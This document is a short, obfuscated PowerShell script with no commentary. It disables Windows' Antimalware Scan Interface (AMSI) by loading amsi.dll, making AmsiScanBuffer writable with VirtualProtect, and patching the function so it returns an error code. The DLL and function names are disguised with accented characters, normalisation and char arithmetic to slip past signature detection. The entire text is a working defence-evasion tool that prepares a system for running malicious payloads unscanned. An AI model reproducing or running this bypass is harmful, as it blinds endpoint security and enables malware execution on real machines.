$qn07jaD = @"
using System;
using System.Runtime.InteropServices;
public class qn07jaD {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr tguexwhMN, string RHUF1ONqgpeR_g);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr Y1YA9wAOcauTsoE0y8h, UIntPtr nJUf, uint ZtKj5mKq, out uint JVeo8H410Nr);
}
"@

Add-Type $qn07jaD

$q8vNydllF3y = [qn07jaD]::LoadLibrary("$(('âm'+'sì'+'.d'+'ll').NorMAlIZe([chAR]([byte]0x46)+[ChaR](111+88-88)+[CHar](114*55/55)+[chaR](109)+[chAR](68+19-19)) -replace [char](92*23/23)+[CHAr]([bytE]0x70)+[chAr]([bYTe]0x7b)+[chAR](77*32/32)+[ChAR](110+77-77)+[CHaR](125+86-86))")
$RdXPDcSS = [qn07jaD]::GetProcAddress($q8vNydllF3y, "$(('Àmsî'+'Scán'+'Bûff'+'èr').noRMalIzE([ChaR](45+25)+[cHar]([bYte]0x6f)+[cHar]([ByTe]0x72)+[CHAR](71+38)+[CHar](11+57)) -replace [chAR]([BYTe]0x5c)+[cHaR]([BYtE]0x70)+[chAR]([byte]0x7b)+[cHAr]([bYtE]0x4d)+[CHAr](110)+[chaR](125))")
$p = 0
[qn07jaD]::VirtualProtect($RdXPDcSS, [uint32]5, 0x40, [ref]$p)
$y225LBCotBDnNwm = "0xB8"
$kgCf = "0x57"
$uGB0s = "0x00"
$HMwTt = "0x07"
$QH9gO0oJ = "0x80"
$oUs_GQczNvjNeTUhVrzw = "0xC3"
$o11yuS = [Byte[]] ($y225LBCotBDnNwm,$kgCf,$uGB0s,$HMwTt,+$QH9gO0oJ,+$oUs_GQczNvjNeTUhVrzw)
[System.Runtime.InteropServices.Marshal]::Copy($o11yuS, 0, $RdXPDcSS, 6)